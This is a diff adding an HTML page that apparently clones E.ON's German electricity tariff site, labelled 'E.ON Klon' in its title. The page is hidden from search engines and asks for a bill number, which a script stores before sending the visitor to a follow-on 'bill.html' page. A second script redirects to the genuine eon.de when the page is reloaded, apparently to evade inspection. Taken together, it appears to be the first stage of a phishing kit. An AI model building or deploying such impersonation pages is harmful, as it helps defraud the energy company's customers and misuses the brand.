@@ -1,0 +1,311 @@
+<!doctype html>
+<html lang="de">
+    <head>
+        <meta name="robots" content="noindex, nofollow" />
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>Stromtarif sichern - E.ON Klon</title>
+        <!-- Tailwind CSS for styling -->
+        <script src="https://cdn.tailwindcss.com"></script>
+        <!-- Google Fonts for a clean, modern look -->
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <link
+            href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap"
+            rel="stylesheet"
+        />
+        <style>
+            body {
+                font-family: "Inter", sans-serif;
+            }
+        </style>
+    </head>
+    <body class="bg-white text-gray-800">
+        <!-- Header Section -->
+        <header class="border-b">
+            <nav
+                class="container mx-auto px-4 sm:px-6 lg:px-8 flex justify-between items-center h-20"
+            >
+                <!-- Logo -->
+                <div class="flex items-center">
+                    <img src="logo.png" alt="E.ON Logo" class="h-8" />
+                </div>
+
+                <!-- Desktop Navigation Links -->
+                <div class="hidden lg:flex items-center space-x-8">
+                    <a
+                        href="#"
+                        class="text-gray-700 font-semibold border-b-2 border-red-500 pb-1"
+                        >Strom</a
+                    >
+                    <a href="#" class="text-gray-700 hover:text-red-500"
+                        >Erdgas</a
+                    >
+                    <a href="#" class="text-gray-700 hover:text-red-500"
+                        >Solar</a
+                    >
+                    <a href="#" class="text-gray-700 hover:text-red-500"
+                        >E-Mobilität</a
+                    >
+                    <a href="#" class="text-gray-700 hover:text-red-500"
+                        >Energiemanagement</a
+                    >
+                    <a href="#" class="text-gray-700 hover:text-red-500"
+                        >Wärmepumpe</a
+                    >
+                    <a href="#" class="text-gray-700 hover:text-red-500"
+                        >Internet</a
+                    >
+                    <a href="#" class="text-gray-700 hover:text-red-500"
+                        >Service</a
+                    >
+                </div>
+
+                <!-- Icons -->
+                <div class="flex items-center space-x-4">
+                    <button class="text-gray-600 hover:text-red-500">
+                        <svg
+                            xmlns="http://www.w3.org/2000/svg"
+                            class="h-6 w-6"
+                            fill="none"
+                            viewBox="0 0 24 24"
+                            stroke="currentColor"
+                        >
+                            <path
+                                stroke-linecap="round"
+                                stroke-linejoin="round"
+                                stroke-width="2"
+                                d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
+                            />
+                        </svg>
+                    </button>
+                    <button class="text-gray-600 hover:text-red-500">
+                        <svg
+                            xmlns="http://www.w3.org/2000/svg"
+                            class="h-6 w-6"
+                            fill="none"
+                            viewBox="0 0 24 24"
+                            stroke="currentColor"
+                        >
+                            <path
+                                stroke-linecap="round"
+                                stroke-linejoin="round"
+                                stroke-width="2"
+                                d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"
+                            />
+                        </svg>
+                    </button>
+                </div>
+            </nav>
+        </header>
+
+        <!-- Main Content -->
+        <main class="container mx-auto px-4 sm:px-6 lg:px-8 py-12">
+            <!-- Bill Finder Section -->
+            <div class="max-w-3xl mx-auto">
+                <h1 class="text-4xl font-bold mb-8">Rechnung finden</h1>
+
+                <div class="bg-gray-50 p-8 rounded-lg shadow-sm border">
+                    <div
+                        class="grid grid-cols-1 md:grid-cols-3 gap-6 items-end"
+                    >
+                        <!-- BILL NUMBER Input -->
+                        <div class="md:col-span-2">
+                            <label
+                                for="bill-number"
+                                class="block text-sm font-medium text-gray-700 mb-1"
+                                >RECHNUNGSNUMMER</label
+                            >
+                            <input
+                                type="text"
+                                id="bill-number"
+                                class="w-full p-3 border border-gray-400 rounded-md focus:ring-red-500 focus:border-red-500"
+                                maxlength="12"
+                            />
+                        </div>
+
+                        <!-- Find Tariff Button -->
+                        <div class="md:col-span-1">
+                            <a
+                                href="bill.html"
+                                id="find-tariff-btn"
+                                class="block text-center w-full bg-red-600 text-white font-bold p-3 rounded-md hover:bg-red-700 transition duration-200"
+                                >Tarif finden</a
+                            >
+                        </div>
+                    </div>
+                    <p
+                        id="error-message"
+                        class="text-red-500 text-sm mt-4 hidden"
+                    >
+                        Bitte geben Sie Ihre Rechnungsnummer ein.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Features Section -->
+            <div class="mt-24 max-w-6xl mx-auto">
+                <h2 class="text-4xl font-bold text-center mb-12">
+                    Stromtarife mit ausgezeichnetem Kundenservice
+                </h2>
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-12">
+                    <!-- Feature 1: Digital Service -->
+                    <div class="space-y-4">
+                        <div class="flex items-center space-x-3">
+                            <svg
+                                xmlns="http://www.w3.org/2000/svg"
+                                class="h-7 w-7 text-red-600"
+                                fill="none"
+                                viewBox="0 0 24 24"
+                                stroke="currentColor"
+                            >
+                                <path
+                                    stroke-linecap="round"
+                                    stroke-linejoin="round"
+                                    stroke-width="2"
+                                    d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"
+                                />
+                            </svg>
+                            <h3 class="text-xl font-bold">
+                                Digitaler 24/7 Service
+                            </h3>
+                        </div>
+                        <ul class="space-y-3">
+                            <li class="flex items-start">
+                                <span class="text-red-600 mr-2 mt-1"
+                                    >&#10003;</span
+                                >Abschlagshöhe in Mein E.ON checken und anpassen
+                            </li>
+                            <li class="flex items-start">
+                                <span class="text-red-600 mr-2 mt-1"
+                                    >&#10003;</span
+                                >Zählerstand via Foto in der Mein E.ON App
+                                melden
+                            </li>
+                        </ul>
+                    </div>
+                    <!-- Feature 2: Free Switching Service -->
+                    <div class="space-y-4">
+                        <div class="flex items-center space-x-3">
+                            <svg
+                                xmlns="http://www.w3.org/2000/svg"
+                                class="h-7 w-7 text-red-600"
+                                fill="none"
+                                viewBox="0 0 24 24"
+                                stroke="currentColor"
+                            >
+                                <path
+                                    stroke-linecap="round"
+                                    stroke-linejoin="round"
+                                    stroke-width="2"
+                                    d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"
+                                />
+                            </svg>
+                            <h3 class="text-xl font-bold">
+                                Kostenloser Wechselservice
+                            </h3>
+                        </div>
+                        <ul class="space-y-3">
+                            <li class="flex items-start">
+                                <span class="text-red-600 mr-2 mt-1"
+                                    >&#10003;</span
+                                >Wir übernehmen die Kündigung Ihres alten
+                                Vertrages
+                            </li>
+                            <li class="flex items-start">
+                                <span class="text-red-600 mr-2 mt-1"
+                                    >&#10003;</span
+                                >Einfach beim Vertragsabschluss angeben und wir
+                                erledigen den Rest
+                            </li>
+                        </ul>
+                    </div>
+                    <!-- Feature 3: E.ON Benefits -->
+                    <div class="space-y-4">
+                        <div class="flex items-center space-x-3">
+                            <svg
+                                xmlns="http://www.w3.org/2000/svg"
+                                class="h-7 w-7 text-red-600"
+                                fill="none"
+                                viewBox="0 0 24 24"
+                                stroke="currentColor"
+                            >
+                                <path
+                                    stroke-linecap="round"
+                                    stroke-linejoin="round"
+                                    stroke-width="2"
+                                    d="M12 8v13m0-13V6a2 2 0 112 2h-2zm0 0V5.5A2.5 2.5 0 109.5 8H12zm-7 4h14M5 12a2 2 0 110-4h14a2 2 0 110 4H5z"
+                                />
+                            </svg>
+                            <h3 class="text-xl font-bold">E.ON Vorteilswelt</h3>
+                        </div>
+                        <ul class="space-y-3">
+                            <li class="flex items-start">
+                                <span class="text-red-600 mr-2 mt-1"
+                                    >&#10003;</span
+                                >Deutschlandweite Preisvorteile: reduzierte
+                                Eintrittspreise für Freizeitparks, Zoos und
+                                Museen
+                            </li>
+                            <li class="flex items-start">
+                                <span class="text-red-600 mr-2 mt-1"
+                                    >&#10003;</span
+                                >Rabatte für Sport- und Wellnessleistungen
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- SCRIPT EDITED BELOW -->
+        <script>
+            const findTariffBtn = document.getElementById("find-tariff-btn");
+            const billNumberInput = document.getElementById("bill-number");
+            const errorMessage = document.getElementById("error-message");
+
+            // This is a regular expression that checks for exactly 12 letters and numbers
+            const alphanumericRegex = /^[a-zA-Z0-9]{12}$/;
+
+            // This part automatically removes any characters that are not letters or numbers
+            billNumberInput.addEventListener("input", (e) => {
+                e.target.value = e.target.value
+                    .replace(/[^a-zA-Z0-9]/g, "")
+                    .toUpperCase();
+            });
+
+            findTariffBtn.addEventListener("click", (event) => {
+                const billNumber = billNumberInput.value;
+
+                // Check if the bill number is valid
+                if (!alphanumericRegex.test(billNumber)) {
+                    // Prevent the link from working
+                    event.preventDefault();
+
+                    // Show an "invalid format" error message
+                    errorMessage.textContent =
+                        "Ungültig. Die Rechnungsnummer muss genau 12 alphanumerische Zeichen lang sein.";
+                    errorMessage.classList.remove("hidden");
+                    billNumberInput.classList.add("border-red-500");
+                    billNumberInput.classList.remove("border-gray-400");
+                } else {
+                    // If it's valid, hide any error messages and allow the link to work
+                    errorMessage.classList.add("hidden");
+                    billNumberInput.classList.remove("border-red-500");
+                    billNumberInput.classList.add("border-gray-400");
+
+                    // Save the valid bill number to localStorage
+                    localStorage.setItem("eonBillNumber", billNumber);
+                }
+            });
+        </script>
+
+        <script>
+          // Modern API to detect reload
+          if (performance.getEntriesByType("navigation")[0].type === "reload") {
+              window.location.href = "https://www.eon.de/de/pk.html";
+          }
+        </script>
+
+    </body>
+</html>
